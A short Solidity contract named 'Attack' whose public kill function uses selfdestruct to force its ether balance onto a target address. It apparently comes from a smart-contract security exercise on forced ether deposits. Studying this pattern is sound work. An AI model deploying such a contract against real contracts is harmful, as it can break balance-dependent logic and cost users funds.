// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    function kill(address payable addr) public payable {
        selfdestruct(addr);
    }

    receive() external payable {}

    // Fallback function is called when msg.data is not empty
    fallback() external payable {}

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}